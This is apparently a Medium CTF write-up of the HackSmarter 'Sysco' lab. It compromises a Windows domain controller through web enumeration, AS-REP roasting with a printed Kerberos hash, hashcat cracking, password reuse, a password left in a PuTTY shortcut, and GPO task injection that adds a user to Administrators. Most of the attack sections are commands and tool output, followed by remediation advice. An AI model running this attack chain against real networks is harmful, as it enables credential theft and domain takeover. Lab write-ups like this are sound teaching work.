# ⚔️ BEYOND THE PERIMETER: Cracking Sysco with Kerberos Exploitation & GPO Task Injection 🛡️💥

When WinRM fails, persistence wins. See how a simple PuTTY shortcut metadata leak led to the total collapse of a Windows Server 2022 Domain…

---

### ⚔️ BEYOND THE PERIMETER: Cracking Sysco with Kerberos Exploitation & GPO Task Injection 🛡️💥

When WinRM fails, persistence wins. See how a simple PuTTY shortcut metadata leak led to the total collapse of a Windows Server 2022 Domain Controller. 🏁👑

![](https://cdn-images-1.medium.com/max/800/1*_b1NuYPRRV7r3Gn5ciuBSw.png)

**Target:** *Sysco (10.0.21.199)\[HackSmarter\]* **OS:** *Windows* **Difficulty:** *Medium* **Attack Vectors:** *Web Enumeration -\> OSINT/Source Code Analysis -\> AS-REP Roasting -\> Account Takeover*

> <a href="https://medium.com/bugbountywriteup/%EF%B8%8F-beyond-the-perimeter-cracking-sysco-with-kerberos-exploitation-gpo-task-injection-%EF%B8%8F-4530db99feea?sk=06cfbeecbfbb5daac0f6cba6f13eefdb" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/bugbountywriteup/%EF%B8%8F-beyond-the-perimeter-cracking-sysco-with-kerberos-exploitation-gpo-task-injection-%EF%B8%8F-4530db99feea?sk=06cfbeecbfbb5daac0f6cba6f13eefdb" target="_blank">**Not a Member?? Click Here to Read Full-Story**</a>

### Executive Summary

**Assessment Date:** January 17, 2026 **Risk Level:** CRITICAL **Author:** R00t3dbyFa17h/Nicholas Mullenski

**Overview**

The “Sysco” engagement revealed significant lapses in both web application security and Active Directory configuration. The target environment was running a non-standard web stack on a Domain Controller, which facilitated information disclosure via the web application’s source code. This leakage allowed for the enumeration of valid domain users, one of whom was vulnerable to AS-REP Roasting, leading to the compromise of a domain user credential.

**Key Findings**

- <span id="730d">**Non-Standard Service Configuration:** The Domain Controller was hosting a public-facing web server using Apache and PHP instead of the standard IIS, expanding the attack surface.</span>
- <span id="94f4">**Information Disclosure:** The web application’s source code contained metadata and “Team” section details that leaked valid employee names, directly enabling username enumeration.</span>
- <span id="7875">**Kerberos Misconfiguration (AS-REP Roasting):** The domain user account “jack.dowland” was configured with “Do not require Kerberos preauthentication,” allowing attackers to request and crack his password hash offline.</span>

### 1.0 Initial Foothold

#### **1.1 Reconnaissance & Enumeration**

**1.1.1 Nmap Scan**

- <span id="25fb">We began the engagement with a comprehensive port scan to identify the attack surface.</span>

Command:

```
nmap -sV -sC -vvv 10.0.21.199
ORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 126 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-favicon: Unknown favicon MD5: DD229045B1B32B2F2407609235A23238
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: Index - Sysco MSP
88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-01-18 02:36:43Z)
135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 126
464/tcp  open  kpasswd5?     syn-ack ttl 126
593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 126
3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 126
3389/tcp open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal ServicesTarget_Name: SYSCO
|   NetBIOS_Domain_Name: SYSCO
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SYSCO.LOCAL
|   DNS_Computer_Name: DC01.SYSCO.LOCAL
```

**1.1.2 Analysis**

The scan revealed a highly unusual configuration for a Windows Domain Controller.

- <span id="9e45">**Port 80 (HTTP):** The server was running Apache 2.4.58 with PHP 8.2.12. This is a non-standard stack for a Windows DC (which typically runs IIS), suggesting a manual installation like XAMPP.</span>
- <span id="2896">**Port 445 (SMB):** Confirmed the host is running Windows Server 2022 with SMB signing enabled.</span>
- <span id="9506">**Port 88 (Kerberos):** Confirmed the host acts as a Domain Controller for the SYSCO.LOCAL domain.</span>

#### **1.2 Web Enumeration**

**1.2.1 Directory Discovery**

- <span id="4ef5">Given the anomalies on Port 80, we prioritized web enumeration. We utilized Feroxbuster to brute-force directory names.</span>

Command:

```
feroxbuster -u http://10.0.21.199 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.0.21.199/
 🚩  In-Scope Url          │ 10.0.21.199
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      297c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      300c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        9l       31w     2057c http://10.0.21.199/assets/img/favicon.png
200      GET       20l      118w     5770c http://10.0.21.199/assets/img/clients/client-6.png
200      GET      574l     1718w    23193c http://10.0.21.199/index.html
200      GET       19l       97w     6012c http://10.0.21.199/assets/img/logo.png
200      GET      119l      654w    61890c http://10.0.21.199/assets/img/team/team-2.jpg
200      GET     2046l     4531w    44102c http://10.0.21.199/assets/css/main.css
200      GET       32l      199w     9277c http://10.0.21.199/assets/img/clients/client-1.png
200      GET      429l     1400w    81512c http://10.0.21.199/assets/img/hero-bg-abstract.jpg
200      GET       82l      555w    46038c http://10.0.21.199/assets/img/team/team-3.jpg
200      GET       13l      182w    18432c http://10.0.21.199/assets/vendor/swiper/swiper-bundle.min.css
200      GET       85l      210w     2734c http://10.0.21.199/assets/vendor/php-email-form/validate.js
200      GET       12l      119w     5485c http://10.0.21.199/assets/vendor/imagesloaded/imagesloaded.pkgd.min.js
200      GET       29l      129w     7722c http://10.0.21.199/assets/img/clients/client-2.png
200      GET       27l      117w     8294c http://10.0.21.199/assets/img/clients/client-3.png
200      GET       21l      128w     8850c http://10.0.21.199/assets/img/clients/client-5.png
200      GET       63l      248w    13619c http://10.0.21.199/assets/img/apple-touch-icon.png
200      GET       30l      118w     7817c http://10.0.21.199/assets/img/clients/client-4.png
200      GET      264l     1413w   115661c http://10.0.21.199/assets/img/team/team-1.jpg
200      GET      218l      473w     6303c http://10.0.21.199/assets/js/main.js
200      GET      190l     1018w    98289c http://10.0.21.199/assets/img/team/team-4.jpg
200      GET        9l      155w     5417c http://10.0.21.199/assets/vendor/purecounter/purecounter_vanilla.js
200      GET       12l      557w    35445c http://10.0.21.199/assets/vendor/isotope-layout/isotope.pkgd.min.js
200      GET        1l     1900w    24750c http://10.0.21.199/assets/vendor/purecounter/purecounter_vanilla.js.map
200      GET     3563l    12286w    91398c http://10.0.21.199/assets/vendor/isotope-layout/isotope.pkgd.js
200      GET        1l      268w    13800c http://10.0.21.199/assets/vendor/aos/aos.js
200      GET        1l        1w   204569c http://10.0.21.199/assets/vendor/swiper/swiper-bundle.min.js.map
200      GET        1l        8w       44c http://10.0.21.199/forms/contact.php
200      GET        1l      233w    13749c http://10.0.21.199/assets/vendor/glightbox/css/glightbox.min.css
200      GET      614l     1878w    19941c http://10.0.21.199/assets/vendor/aos/aos.cjs.js
200      GET        1l     4909w    56459c http://10.0.21.199/assets/vendor/aos/aos.js.map
200      GET      610l     1856w    19768c http://10.0.21.199/assets/vendor/aos/aos.esm.js
200      GET       14l     1738w   151102c http://10.0.21.199/assets/vendor/swiper/swiper-bundle.min.js
200      GET     2078l    10308w    98255c http://10.0.21.199/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET        7l     1207w    80721c http://10.0.21.199/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        1l      273w    28765c http://10.0.21.199/assets/vendor/aos/aos.css
200      GET        5l       21w    85875c http://10.0.21.199/assets/vendor/bootstrap-icons/bootstrap-icons.min.css
200      GET     2052l     4102w    52358c http://10.0.21.199/assets/vendor/bootstrap-icons/bootstrap-icons.json
200      GET        6l     2222w   232803c http://10.0.21.199/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET     2090l     4188w    57755c http://10.0.21.199/assets/vendor/bootstrap-icons/bootstrap-icons.scss
200      GET      233l     1190w    96948c http://10.0.21.199/assets/img/services.jpg
200      GET      336l      711w    38530c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-9.jpg
200      GET       71l      380w    30729c http://10.0.21.199/assets/img/testimonials/testimonials-3.jpg
200      GET      211l     1395w   118504c http://10.0.21.199/assets/img/about.jpg
200      GET      147l      531w    38450c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-6.jpg
200      GET      120l      618w    52670c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-8.jpg
200      GET       63l      721w    43571c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-1.jpg
200      GET      201l      526w    37370c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-5.jpg
200      GET       90l      527w    40608c http://10.0.21.199/assets/img/testimonials/testimonials-5.jpg
200      GET      160l      818w    71959c http://10.0.21.199/assets/img/testimonials/testimonials-1.jpg
200      GET       88l      408w    36465c http://10.0.21.199/assets/img/testimonials/testimonials-4.jpg
200      GET      411l     2152w   174108c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-7.jpg
200      GET      117l      426w    33265c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-3.jpg
200      GET      244l     1332w   103224c http://10.0.21.199/assets/img/testimonials/testimonials-2.jpg
200      GET      179l      494w    31077c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-4.jpg
200      GET      690l     3708w   262900c http://10.0.21.199/assets/img/masonry-portfolio/masonry-portfolio-2.jpg
200      GET        1l      637w    56300c http://10.0.21.199/assets/vendor/glightbox/js/glightbox.min.js
200      GET      574l     1718w    23193c http://10.0.21.199/
301      GET        9l       30w      335c http://10.0.21.199/assets => http://10.0.21.199/assets/
301      GET        9l       30w      334c http://10.0.21.199/forms => http://10.0.21.199/forms/
200      GET      574l     1718w    23193c http://10.0.21.199/Index.html
503      GET       11l       44w      400c http://10.0.21.199/examples
403      GET       11l       47w      419c http://10.0.21.199/licenses
403      GET       11l       47w      419c http://10.0.21.199/phpmyadmin
200      GET        6l       15w      219c http://10.0.21.199/readme.txt
200      GET        6l       15w      219c http://10.0.21.199/Readme.txt
200      GET        6l       15w      219c http://10.0.21.199/README.txt
403      GET       11l       47w      419c http://10.0.21.199/server-status
403      GET       11l       47w      419c http://10.0.21.199/server-info
403      GET       11l       47w      419c http://10.0.21.199/webalizer
[####################] - 19s    37556/37556   0s      found:69      errors:0
[####################] - 15s    18456/18456   1201/s  http://10.0.21.199/
[####################] - 1s     18456/18456   16597/s http://10.0.21.199/assets/img/clients/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   78203/s http://10.0.21.199/assets/img/team/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     18456/18456   34497/s http://10.0.21.199/forms/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   297677/s http://10.0.21.199/assets/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   114634/s http://10.0.21.199/assets/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   51553/s http://10.0.21.199/assets/vendor/isotope-layout/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   53187/s http://10.0.21.199/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   212138/s http://10.0.21.199/assets/vendor/php-email-form/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   54123/s http://10.0.21.199/assets/vendor/purecounter/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     18456/18456   40563/s http://10.0.21.199/assets/vendor/swiper/ => Directory listing (add --scan-dir-listings to scan)
```

**1.2.2 Critical Discoveries**

The scan uncovered several exposed paths:

- <span id="fb6d">**/forms/:** A directory with listing enabled, exposing contact.php.</span>
- <span id="4ca1">**/cgi-bin/printenv.pl:** A Perl script that leaked server environment variables, confirming the web root was located at C:/xampp/htdocs.</span>
- <span id="8451">**/roundcube/:** A login portal for Roundcube Webmail (Version 1.6.11).</span>

### 2.0 User Enumeration

**2.1 OSINT & Source Code Analysis**

**2.1.1 The “Team” Leak**

- <span id="030c">With technical enumeration on SMB failing due to access restrictions, we pivoted to analyzing the web content. The “Sysco MSP” website utilized a template that included a “Team” section. By inspecting the HTML source code near the team images, we extracted valid employee names.</span>

Command:

```
curl -s http://dc01.sysco.local/index.html | grep -A 20 "img/team"
```

**2.1.2 Identified Targets:** This analysis confirmed four valid employees:

- <span id="5310">Greg Shields (System Administrator)</span>
- <span id="53d6">Sarah Jhonson (Sales Representative)</span>
- <span id="8622">Jack Dowland (Helpdesk Associate)</span>
- <span id="e5de">Lainey Moore (System Engineer)</span>

From these names, we generated a list of potential usernames (e.g., jack.dowland, greg.shields) for further testing.

### 3.0 Exploitation

#### **3.1 AS-REP Roasting**

**3.1.1 The Vulnerability** We utilized the user list generated in the previous step to check for AS-REP Roasting vulnerabilities. This attack targets users who have “Do not require Kerberos preauthentication” enabled, allowing an attacker to request a TGT (Ticket Granting Ticket) without knowing the password.

Command:

```
impacket-GetNPUsers SYSCO.LOCAL/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.0.21.199 -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User greg.shields doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$jack.dowland@SYSCO.LOCAL:1a5b8595ea805a849dbd8426923e94d2$4173a11d3d14ed83a122c9e5a4bf7cb6e60e4ce8a82db96ee62cd41a23df778fbbcb96f15c6ed3cf8e1eef3771c952d92552048b58836f841bae0548a6074fa7b467ed766140d4ddf1e33360f8f5880a4362700a0284225d6b7469fff35528cff6299a3fc9f2828e8ff87e9a7450b03a053c327d91ca993d4f0b5b8f42601d64706231659a1a622dcd4ed8ac8f30a48a8d1a284d0287f42de16ddead003f186f3908890df4497f028f5b30365afc0cbeb477705e151a2b29ee3396438a6f18f687cf1a0f6a9490c531307015bb13c470daacca230979347fd631b64ea53345f36a95fced2c2bfc7bfc7c
[-] User lainey.moore doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**3.1.2 The Result**

- <span id="f021">The attack was successful against the user **jack.dowland**. The Domain Controller returned his encrypted Kerberos hash, while other users were secure.</span>

#### **3.2 Password Cracking**

- <span id="9bf4">We took the captured hash offline and utilized Hashcat to crack it against the RockYou wordlist.</span>

Command:

```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 9 7900X 12-Core Processor, 12921/25843 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (11849 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$jack.dowland@SYSCO.LOCAL:1a5b8595ea805a849dbd8426923e94d2$4173a11d3d14ed83a122c9e5a4bf7cb6e60e4ce8a82db96ee62cd41a23df778fbbcb96f15c6ed3cf8e1eef3771c952d92552048b58836f841bae0548a6074fa7b467ed766140d4ddf1e33360f8f5880a4362700a0284225d6b7469fff35528cff6299a3fc9f2828e8ff87e9a7450b03a053c327d91ca993d4f0b5b8f42601d64706231659a1a622dcd4ed8ac8f30a48a8d1a284d0287f42de16ddead003f186f3908890df4497f028f5b30365afc0cbeb477705e151a2b29ee3396438a6f18f687cf1a0f6a9490c531307015bb13c470daacca230979347fd631b64ea53345f36a95fced2c2bfc7bfc7c:mXXXXXXX1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$jack.dowland@SYSCO.LOCAL:1a5b8595ea80...7bfc7c
Time.Started.....: Sat Jan 17 23:52:23 2026 (0 secs)
Time.Estimated...: Sat Jan 17 23:52:23 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2175.0 kH/s (1.40ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 73728/14344385 (0.51%)
Rejected.........: 0/73728 (0.00%)
Restore.Point....: 65536/14344385 (0.46%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: ryanscott -> compusa
Hardware.Mon.#01.: Util: 22%

Started: Sat Jan 17 23:52:14 2026
Stopped: Sat Jan 17 23:52:24 2026
```

#### 3.3 Validating Access: The First Pwn

**3.3.1** Before moving laterally, we had to verify these credentials against the Domain Controller using **`NetExec`** (nxc).

- <span id="0a40">**Command**: **`nxc smb 10.0.21.199 -u jack.dowland -p 'mXXXXXXXX1'`**.</span>
- <span id="e925">**Output**: The green **`[+]`** confirmed valid credentials, though not administrative yet.</span>

![](https://cdn-images-1.medium.com/max/800/1*lV7uiqC5y2ZBDWxTdjg7ZA.png)

#### 3.4 Lateral Movement: Roundcube & Cisco Leak

**3.4.1** As a “Helpdesk” employee, Jack had access to internal communications. We leveraged this by logging into the Roundcube webmail portal discovered during enumeration.

- <span id="afd1">**Access Path**: <a href="http://10.1.103.182/roundcube" class="markup--anchor markup--li-anchor" data-href="http://10.1.103.182/roundcube" rel="noopener" target="_blank"><strong><code class="markup--code markup--li-code">http://10.1.103.182/roundcube</code></strong></a></span>
- <span id="cb23">**Discovery**: An internal email regarding “Router Maintenance” contained a Cisco configuration snippet.</span>

![](https://cdn-images-1.medium.com/max/800/1*aHJ1Mm326k6KZyDSF8oLvQ.png)

- <span id="e4c3">**The Vulnerability**: The configuration leaked a Cisco **`Type 5`** enable secret hash.</span>

![](https://cdn-images-1.medium.com/max/800/1*QOCYWmBgYg6ALOZtChhdQA.png)

**3.4.2** We took the Cisco hash offline to crack the secondary password.

- <span id="fbd9">**Command**: **`hashcat -m 500 cisco_hash.txt /usr/share/wordlists/rockyou.txt`**</span>
- <span id="389f">**Result**: **`CXXXXXXX1`**</span>

#### 3.5 Credential Stuffing & RDP Access

**3.5.1** Following the principle of password reuse, we tested `CXXXXXXX1` against our remaining user list.

- <span id="d8fc">**Command**: **`nxc smb 10.0.21.199 -u users.txt -p 'CXXXXXXX1'`**</span>
- <span id="92c8">**The Match**: The account **`lainey.moore`** successfully authenticated with this password.</span>

![](https://cdn-images-1.medium.com/max/800/1*hYx5Nt2EkgZDCdl_YIVIpA.png)

**3.5.2** While **`evil-winrm`** was unresponsive, we confirmed that the "Remote Desktop Users" group membership allowed for a GUI session.

- <span id="d523">**Command**: **`xfreerdp3 /v:10.0.21.199 /u:lainey.moore /p:CXXXXXXX1 /cert:ignore /dynamic-resolution +clipboard`**</span>

#### 3.6 Initial Objective: User Flag

**3.6.1** Once the RDP session was established as **`lainey.moore`**, we prioritized the retrieval of the user flag to confirm local access.

- <span id="0249">**Location**: The flag was located on the user’s desktop as expected in standard CTF environments.</span>
- <span id="b331">**Command**: **`type C:\Users\lainey.moore\Desktop\user.txt`**</span>
- <span id="7c35">**Flag**:</span>

![](https://cdn-images-1.medium.com/max/800/1*R5hCTce2t2Yq_8utkObPKw.png)

### 4.0 Escalation: The PuTTY Metadata Leak

**4.0.1** Inside the RDP session, we performed local enumeration on Lainey’s **`Documents`** folder and discovered a PuTTY shortcut file (**`.lnk`**).

**4.0.2** We analyzed the shortcut’s metadata to reveal the execution arguments.

- <span id="9744">**Command**: **`type "Putty - HS Router Login.lnk"`**</span>
- <span id="5555">**The Critical Leak**: The administrator had hardcoded the login command with a plain-text password.</span>
- <span id="ceee">**Credentials Found**: **`greg.shields`** : **`5XXXXXXXXXXXXXXX!`**</span>

**4.0.3** To verify these new credentials, we attempted to elevate our current session. When prompted by User Account Control (UAC), we successfully authenticated using the recovered credentials for **`greg.shields`**.

### 5.0 Domain Admin: GPO Abuse

**5.0.1** With credentials for the System Administrator, **greg.shields**, we aimed for total domain compromise. Due to network instability affecting remote services, we utilized **GPO Abuse** to escalate our privileges.

**5.0.2** We used **`pyGPOAbuse.py`** to inject an immediate scheduled task into the **Default Domain Policy**.

- <span id="c054">**Command**: **`python3 pygpoabuse.py 'SYSCO.LOCAL'/'greg.shields':'5XXXXXXXXXXXXXXXXX!' -dc-ip 10.0.21.199 -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup Administrators greg.shields /add' -taskname "PrivEsc"`**.</span>

![](https://cdn-images-1.medium.com/max/800/1*OTGIAixP6tJIR6OFGleZfw.png)

**5.0.3** We triggered the attack by forcing a Group Policy update within our active RDP session.

- <span id="32be">**Command**: **`gpupdate /force`**.</span>

![](https://cdn-images-1.medium.com/max/800/1*jEApzjNBGCpVUYlXzyEWjQ.png)

**5.0.4** We verified the successful escalation by checking the Domain Controller’s SMB status.

![](https://cdn-images-1.medium.com/max/800/1*pcZW8OgPv6Sk4Hi1GBeR5w.png)

- <span id="c4eb">**Command**: **`nxc smb 10.0.21.199 -u greg.shields -p '5XXXXXXXXXXXXXXXXXXX'`**.</span>
- <span id="b9b3">**Result**: The coveted **`(Pwn3d!)`** status was achieved.</span>

![](https://cdn-images-1.medium.com/max/800/1*jI1tNbAkb6ZnYDJFeE17kA.png)

### 6.0 Final Compromise (Root Flag)

**6.0.1** Because we were working within an RDP session, we utilized the PS to spawn an elevated shell as Greg Shields.

- <span id="49aa">**Right-Click** run as Administrator, type in username & password</span>
- <span id="fb1c">**Elevation**: After providing the recovered password, we successfully accessed the Administrator’s desktop.</span>
- <span id="a218">**Root Flag**: **`type C:\Users\Administrator\Desktop\root.txt`**.</span>

![](https://cdn-images-1.medium.com/max/800/1*vpdonBRDPa4LbX_urO8png.png)

![](https://cdn-images-1.medium.com/max/800/1*YKyUR8ayOKGIUYgJHSj76A.png)

### 7.0 Red Team Mandate:

**7.1 Strategic Analysis** The compromise of the Sysco Domain Controller highlights the critical danger of “Service Creep”. By installing a non-standard Apache/PHP stack directly on the DC, the organization effectively bypassed the hardened security posture typical of a Windows environment, creating a roadmap for attackers via information disclosure and source code analysis.

**7.2 Tactical Failures**

- <span id="83e3">**The Metadata Trail**: Valid employee names were harvested directly from the web application’s “Team” section, eliminating the need for noisy brute-force enumeration.</span>
- <span id="0990">**Kerberos Negligence**: Leaving AS-REP Roasting enabled for **`jack.dowland`** allowed for an offline attack that bypassed all network-based monitoring.</span>
- <span id="72ef">**Credential Hygiene**: The reuse of a Cisco enable secret for a system engineer’s domain account facilitated lateral movement.</span>
- <span id="2a35">**Administrative Sloppiness**: Storing a plain-text password within a PuTTY shortcut metadata provided the final “Keys to the Kingdom”.</span>

### 8.0 Remediation & Hardening Roadmap

- <span id="f43e">**Decommission Non-Standard DC Services** Immediately remove the Apache/PHP (XAMPP) stack from the Domain Controller. All web hosting should be migrated to a segmented, non-privileged member server to reduce the attack surface of the core identity provider.</span>
- <span id="7254">**Disable AS-REP Roasting Vulnerabilities** Audit all Active Directory accounts and ensure the attribute “Do not require Kerberos preauthentication” is disabled. This forces the KDC to require a timestamp encrypted with the user’s password, preventing attackers from requesting a crackable TGT offline.</span>
- <span id="5f0d">**Sanitize Public-Facing Information** Scrub all internal employee names, technical metadata, and environment details from public-facing web templates and directory listings. Information disclosure is the primary driver for successful initial reconnaissance.</span>
- <span id="1a7e">**Eliminate Cleartext Credential Storage** Enforce a strict policy against storing passwords in command-line arguments, scripts, or shortcut metadata. Utilize a secure Password Vaulting solution for administrative credentials and implement Group Policy Objects (GPOs) to restrict where these shortcuts can be created.</span>
- <span id="d641">**Harden Group Policy Object Permissions** Audit the “Write” and “Apply” permissions on the Default Domain Policy and other sensitive GPOs. Ensure that only a strictly limited and audited “Domain Admins” group has the authority to modify these policies to prevent unauthorized task injection.</span>

### 📜 Spiritual Perspective: The Hidden Foundation

**Bible Verse**: *Luke 12:2 (KJV)*

> *“For there is nothing covered, that shall not be revealed; neither hid, that shall not be known.”*

**The Tie-In to Cyber & Technology:** In the world of technology, we often operate under the illusion that obscurity equals security. We hide passwords in binary files, we bury misconfigurations in complex GPO trees, and we assume our “hidden” web server stack is safe. But as this engagement proves, every hidden flaw is eventually brought to light by a persistent actor.

True security — like true faith — is not about what you can hide from others, but about the integrity of the foundation when it is tested. Just as a single hidden sin can compromise a life, a single hidden password in a shortcut file can compromise an entire Domain. We must secure our systems not by covering our tracks, but by building them so correctly that even when they are “revealed,” they remain standing.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="b582">Is there a specific tool you wish existed?</span>
- <span id="389e">Is there a hacking concept you want me to learn and explain?</span>
- <span id="b9f5">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/FjWpMW9SUX" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/FjWpMW9SUX" title="https://discord.gg/FjWpMW9SUX"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>Welcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…</em>discord.gg</a><a href="https://discord.gg/FjWpMW9SUX" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="fd4a28d0f7710c400275a7d63c666614"></a>

<a href="https://github.com/R00t3dbyFa17h" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://github.com/R00t3dbyFa17h" title="https://github.com/R00t3dbyFa17h"><strong>R00t3dbyFa17h - Overview</strong><br />
<em>Offensive Security Researcher &amp; Tool Developer. Here to secure the digital world one endpoint at a time!! …</em>github.com</a><a href="https://github.com/R00t3dbyFa17h" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="3ee08a69482310c5660137f9d4af7614" data-thumbnail-img-id="0*HMlwW2UJFf1l2doU" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*HMlwW2UJFf1l2doU);"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 25, 2026](https://medium.com/p/4530db99feea).

<a href="https://medium.com/@nicholasmullenski/%EF%B8%8F-beyond-the-perimeter-cracking-sysco-with-kerberos-exploitation-gpo-task-injection-%EF%B8%8F-4530db99feea" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
